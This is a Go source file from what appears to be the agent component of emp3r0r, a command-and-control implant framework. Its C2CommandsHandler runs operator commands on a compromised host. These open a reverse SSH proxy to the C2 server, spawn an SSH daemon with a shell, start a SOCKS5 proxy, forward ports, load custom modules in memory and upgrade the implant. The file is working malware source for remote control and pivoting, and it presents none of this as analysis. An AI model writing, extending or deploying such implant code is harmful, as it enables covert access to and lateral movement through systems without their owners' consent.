package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"time"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/pflag"
)

func C2CommandsHandler(cmdSlice []string) (out string) {
	var err error

	// parse command-line arguments using pflag
	flags := pflag.NewFlagSet(cmdSlice[0], pflag.ContinueOnError)
	flags.Parse(cmdSlice[1:])

	switch cmdSlice[0] {

	// stat file
	// !stat --path '/path/to/a file name.txt'
	case emp3r0r_data.C2CmdStat:
		path := flags.StringP("path", "p", "", "Path to stat")
		flags.Parse(cmdSlice[1:])
		if *path == "" {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}

		fi, err := os.Stat(*path)
		if err != nil || fi == nil {
			out = fmt.Sprintf("Error: cant stat file %s: %v", *path, err)
			return
		}
		fstat := &util.FileStat{}
		fstat.Name = util.FileBaseName(*path)
		fstat.Size = fi.Size()
		fstat.Checksum = tun.SHA256SumFile(*path)
		fstat.Permission = fi.Mode().String()
		fiData, err := json.Marshal(fstat)
		out = string(fiData)
		if err != nil {
			out = fmt.Sprintf("Error: cant marshal file info %s: %v", *path, err)
		}
		return

	// !bring2cc --addr target_agent_ip
	case emp3r0r_data.C2CmdBring2CC:
		addr := flags.StringP("addr", "a", "", "Target agent IP address")
		flags.Parse(cmdSlice[1:])
		if *addr == "" {
			out = fmt.Sprintf("Error args error: %v", cmdSlice)
			return
		}
		out = "Bring2CC: Reverse proxy for " + *addr + " finished"

		hasInternet := tun.HasInternetAccess(emp3r0r_data.CCAddress, RuntimeConfig.C2TransportProxy)
		isProxyOK := tun.IsProxyOK(RuntimeConfig.C2TransportProxy, emp3r0r_data.CCAddress)
		if !hasInternet && !isProxyOK {
			out = "Error: We don't have any internet to share"
		}
		for p, cancelfunc := range ReverseConns {
			if *addr == p {
				cancelfunc() // cancel existing connection
			}
		}
		addrWithPort := *addr + ":" + RuntimeConfig.SSHProxyPort
		ctx, cancel := context.WithCancel(context.Background())
		if err = tun.SSHReverseProxyClient(addrWithPort, RuntimeConfig.Password,
			&ReverseConns,
			emp3r0r_data.ProxyServer,
			ctx, cancel); err != nil {
			out = err.Error()
		}
		return

	case emp3r0r_data.C2CmdSSHD:
		// sshd server
		// !sshd --shell shell --port port --args args
		shell := flags.StringP("shell", "s", "", "Shell to use")
		port := flags.StringP("port", "p", "", "Port to use")
		args := flags.StringSliceP("args", "a", []string{}, "Arguments for SSHD")
		flags.Parse(cmdSlice[1:])
		if *shell == "" || *port == "" {
			out = fmt.Sprintf("Error: args error: %s", cmdSlice)
			log.Print(out)
			return
		}
		log.Printf("Got sshd request: %s", cmdSlice)
		go func() {
			out = "success"
			err = SSHD(*shell, *port, *args)
			if err != nil {
				out = fmt.Sprintf("Error: %v", err)
			}
		}()
		for !tun.IsPortOpen("127.0.0.1", *port) {
			time.Sleep(100 * time.Millisecond)
			if err != nil {
				out = fmt.Sprintf("Error: sshd failed to start: %v\n%s", err, out)
				break
			}
		}
		return

	// !proxy --mode on --addr 0.0.0.0:12345
	case emp3r0r_data.C2CmdProxy:
		mode := flags.StringP("mode", "m", "", "Proxy mode")
		addr := flags.StringP("addr", "a", "", "Address to bind")
		flags.Parse(cmdSlice[1:])
		if *mode == "" || *addr == "" {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			log.Print(out)
			return
		}
		log.Printf("Got proxy request: %s", cmdSlice)
		err = Socks5Proxy(*mode, *addr)
		if err != nil {
			out = fmt.Sprintf("Error: Failed to start Socks5Proxy: %v", err)
		}
		out = fmt.Sprintf("Socks5Proxy server ready with username %s and password %s",
			RuntimeConfig.ShadowsocksPort,
			RuntimeConfig.Password)
		return

	// !port_fwd --to/listen [to/listen] --shID [shID] --operation/protocol [operation/protocol] --timeout [timeout]
	case emp3r0r_data.C2CmdPortFwd:
		to := flags.StringP("to", "t", "", "Target address")
		sessionID := flags.StringP("shID", "s", "", "Session ID")
		operation := flags.StringP("operation", "o", "", "Operation type")
		timeout := flags.IntP("timeout", "T", 0, "Timeout")
		flags.Parse(cmdSlice[1:])
		if *to == "" || *sessionID == "" || *operation == "" {
			out = fmt.Sprintf("Error: Invalid command: %v", cmdSlice)
			return
		}
		out = "success"
		switch *operation {
		case "stop":
			pf, exist := PortFwds[*sessionID]
			if exist {
				pf.Cancel()
				out = fmt.Sprintf("Warning: port mapping %s stopped", pf.Addr)
				break
			}
			out = fmt.Sprintf("Error: port mapping %s not found", pf.Addr)
		case "reverse":
			go func() {
				err = PortFwd(*to, *sessionID, "tcp", true, 0)
				if err != nil {
					out = fmt.Sprintf("Error: PortFwd (reverse) failed: %v", err)
				}
			}()
		default:
			go func() {
				err = PortFwd(*to, *sessionID, *operation, false, *timeout)
				if err != nil {
					out = fmt.Sprintf("Error: PortFwd failed: %v", err)
				}
			}()
		}
		return

	// !delete_portfwd --id id
	case emp3r0r_data.C2CmdDeletePortFwd:
		id := flags.StringP("id", "i", "", "Session ID")
		flags.Parse(cmdSlice[1:])
		if *id == "" {
			return
		}
		for sessionID, session := range PortFwds {
			if sessionID == *id {
				session.Cancel()
			}
		}
		return

	// !utils
	case emp3r0r_data.C2CmdUtils:
		out = VaccineHandler()
		if out != "[+] Utils have been successfully installed" {
			out = fmt.Sprintf("Error: %s", out)
		}
		return

	// !custom_module --mod_name mod_name --checksum checksum
	case emp3r0r_data.C2CmdCustomModule:
		modName := flags.StringP("mod_name", "m", "", "Module name")
		checksum := flags.StringP("checksum", "c", "", "Checksum")
		inMem := flags.BoolP("in_mem", "i", false, "Load module in memory")
		flags.Parse(cmdSlice[1:])
		if *modName == "" || *checksum == "" {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}
		out = moduleHandler(*modName, *checksum, *inMem)
		return

	// !upgrade_agent --checksum checksum
	case emp3r0r_data.C2CmdUpdateAgent:
		checksum := flags.StringP("checksum", "c", "", "Checksum")
		flags.Parse(cmdSlice[1:])
		if *checksum == "" {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}
		out = Upgrade(*checksum)
		return

	default:
		// let per-platform C2CommandsHandler do the job
		out = platformC2CommandsHandler(cmdSlice)
	}
	return
}
